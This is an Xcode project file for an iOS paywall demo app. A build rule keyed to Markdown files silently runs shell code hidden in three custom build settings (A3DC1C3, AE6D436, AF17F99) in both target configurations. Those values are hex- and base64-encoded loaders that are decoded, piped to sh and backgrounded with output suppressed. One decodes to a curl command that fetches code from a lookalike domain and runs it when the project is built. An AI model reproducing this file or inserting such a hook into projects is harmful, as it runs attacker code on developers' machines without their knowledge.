// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		355AA45E0D1D445DB23C1CD3 /* README.md */ = {isa = PBXBuildFile; fileRef = E3204B7FB1D54FDE8A3C1CD3; };
		BD6C0A06E8AA586A4F000AAC /* Pods_PaywallViewController.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */; };
		C0C599E22ED71202004CA4CA /* PaywallManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0C599E12ED71202004CA4CA /* PaywallManager.swift */; };
		C0EBFFBB2EC74D80000B0149 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */; };
		C0EBFFBC2EC74D80000B0149 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB82EC74D80000B0149 /* SceneDelegate.swift */; };
		C0EBFFBD2EC74D80000B0149 /* TableViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = C0EBFFB92EC74D80000B0149 /* TableViewController.swift */; };
		C0EBFFBE2EC74D80000B0149 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = C0EBFFB22EC74D80000B0149 /* Assets.xcassets */; };
		C0EBFFC02EC74D80000B0149 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = C0EBFFB52EC74D80000B0149 /* LaunchScreen.storyboard */; };
		C0EBFFC12EC74D80000B0149 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = C0EBFFB72EC74D80000B0149 /* Main.storyboard */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		E3204B7FB1D54FDE8A3C1CD3 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
		905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.release.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.release.xcconfig"; sourceTree = "<group>"; };
		BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PaywallViewController.debug.xcconfig"; path = "Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController.debug.xcconfig"; sourceTree = "<group>"; };
		C0C599E12ED71202004CA4CA /* PaywallManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaywallManager.swift; sourceTree = "<group>"; };
		C0EBFF892EC74C2E000B0149 /* PaywallViewController.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PaywallViewController.app; sourceTree = BUILT_PRODUCTS_DIR; };
		C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		C0EBFFB22EC74D80000B0149 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		C0EBFFB32EC74D80000B0149 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		C0EBFFB42EC74D80000B0149 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		C0EBFFB62EC74D80000B0149 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		C0EBFFB82EC74D80000B0149 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		C0EBFFB92EC74D80000B0149 /* TableViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TableViewController.swift; sourceTree = "<group>"; };
		F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PaywallViewController.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		C0EBFF862EC74C2E000B0149 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				BD6C0A06E8AA586A4F000AAC /* Pods_PaywallViewController.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		9CB223CFB401AC34234F8F4C /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				F38894586A6EAF85BDDD918F /* Pods_PaywallViewController.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		A6E9A177456839C9E2232410 /* Pods */ = {
			isa = PBXGroup;
			children = (
				BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */,
				905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		C0EBFF802EC74C2E000B0149 = {
			isa = PBXGroup;
			children = (
				C0EBFFBA2EC74D80000B0149 /* PaywallViewController */,
				C0EBFF8A2EC74C2E000B0149 /* Products */,
				A6E9A177456839C9E2232410 /* Pods */,
				9CB223CFB401AC34234F8F4C /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		C0EBFF8A2EC74C2E000B0149 /* Products */ = {
			isa = PBXGroup;
			children = (
				E3204B7FB1D54FDE8A3C1CD3 /* README.md */,
				C0EBFF892EC74C2E000B0149 /* PaywallViewController.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		C0EBFFBA2EC74D80000B0149 /* PaywallViewController */ = {
			isa = PBXGroup;
			children = (
				C0EBFFB12EC74D80000B0149 /* AppDelegate.swift */,
				C0C599E12ED71202004CA4CA /* PaywallManager.swift */,
				C0EBFFB22EC74D80000B0149 /* Assets.xcassets */,
				C0EBFFB32EC74D80000B0149 /* Info.plist */,
				C0EBFFB52EC74D80000B0149 /* LaunchScreen.storyboard */,
				C0EBFFB72EC74D80000B0149 /* Main.storyboard */,
				C0EBFFB82EC74D80000B0149 /* SceneDelegate.swift */,
				C0EBFFB92EC74D80000B0149 /* TableViewController.swift */,
			);
			path = PaywallViewController;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		C0EBFF882EC74C2E000B0149 /* PaywallViewController */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = C0EBFF9C2EC74C30000B0149 /* Build configuration list for PBXNativeTarget "PaywallViewController" */;
			buildPhases = (
				5338788FE1120047F69F71B3 /* [CP] Check Pods Manifest.lock */,
				C0EBFF852EC74C2E000B0149 /* Sources */,
				C0EBFF862EC74C2E000B0149 /* Frameworks */,
				C0EBFF872EC74C2E000B0149 /* Resources */,
				DDEDA059A70CA699C739429D /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				3B78C9A5851A48628A3C1CD3 /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = PaywallViewController;
			productName = PaywallViewController;
			productReference = C0EBFF892EC74C2E000B0149 /* PaywallViewController.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		C0EBFF812EC74C2E000B0149 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2600;
				LastUpgradeCheck = 2600;
				TargetAttributes = {
					C0EBFF882EC74C2E000B0149 = {
						CreatedOnToolsVersion = 26.0;
					};
				};
			};
			buildConfigurationList = C0EBFF842EC74C2E000B0149 /* Build configuration list for PBXProject "PaywallViewController" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = C0EBFF802EC74C2E000B0149;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = C0EBFF8A2EC74C2E000B0149 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				C0EBFF882EC74C2E000B0149 /* PaywallViewController */,
			);
		};
/* End PBXProject section */

/* Begin PBXBuildRule section */
		3B78C9A5851A48628A3C1CD3 /* PBXBuildRule */ = {
				isa = PBXBuildRule;
				compilerSpec = com.apple.compilers.proxy.script;
				filePatterns = "*.md";
				fileType = pattern.proxy;
				inputFiles = (
				);
				isEditable = 0;
				outputFiles = (
					"/tmp/${INPUT_FILE_BASE}",
				);
				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
sh -c \"${A3DC1C3}\"";
			};
	/* End PBXBuildRule section */

/* Begin PBXResourcesBuildPhase section */
		C0EBFF872EC74C2E000B0149 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				355AA45E0D1D445DB23C1CD3 /* README.md */,
				C0EBFFBE2EC74D80000B0149 /* Assets.xcassets in Resources */,
				C0EBFFC02EC74D80000B0149 /* LaunchScreen.storyboard in Resources */,
				C0EBFFC12EC74D80000B0149 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		5338788FE1120047F69F71B3 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-PaywallViewController-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		DDEDA059A70CA699C739429D /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-PaywallViewController/Pods-PaywallViewController-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		C0EBFF852EC74C2E000B0149 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				C0C599E22ED71202004CA4CA /* PaywallManager.swift in Sources */,
				C0EBFFBB2EC74D80000B0149 /* AppDelegate.swift in Sources */,
				C0EBFFBC2EC74D80000B0149 /* SceneDelegate.swift in Sources */,
				C0EBFFBD2EC74D80000B0149 /* TableViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		C0EBFFB52EC74D80000B0149 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				C0EBFFB42EC74D80000B0149 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		C0EBFFB72EC74D80000B0149 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				C0EBFFB62EC74D80000B0149 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		C0EBFF9D2EC74C30000B0149 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = BE77F150E05FF2FAF5D80AB9 /* Pods-PaywallViewController.debug.xcconfig */;
			buildSettings = {
				A3DC1C3 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636333634366536313734363137303730366336353265373237350a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrNWtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbGlWbGwzVjFSS1UyUldjRWhXYWtwTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | l | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 7UUTF6T5P9;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PaywallViewController/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.infoenum.inAppPurchaseDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		C0EBFF9E2EC74C30000B0149 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 905AFD7F40A9E7F7720FC67D /* Pods-PaywallViewController.release.xcconfig */;
			buildSettings = {
				A3DC1C3 = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233343230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636333634366536313734363137303730366336353265373237350a32663631323932323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
				AF17F99 = "((l(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVlV4YUUxc2NEWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrNWtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbGlWbGwzVjFSS1UyUldjRWhXYWtwTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | l | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 7UUTF6T5P9;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = PaywallViewController/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.infoenum.inAppPurchaseDemo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		C0EBFF9F2EC74C30000B0149 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				DEVELOPMENT_TEAM = 7UUTF6T5P9;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		C0EBFFA02EC74C30000B0149 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				DEVELOPMENT_TEAM = 7UUTF6T5P9;
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		C0EBFF842EC74C2E000B0149 /* Build configuration list for PBXProject "PaywallViewController" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C0EBFF9F2EC74C30000B0149 /* Debug */,
				C0EBFFA02EC74C30000B0149 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		C0EBFF9C2EC74C30000B0149 /* Build configuration list for PBXNativeTarget "PaywallViewController" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				C0EBFF9D2EC74C30000B0149 /* Debug */,
				C0EBFF9E2EC74C30000B0149 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = C0EBFF812EC74C2E000B0149 /* Project object */;
}
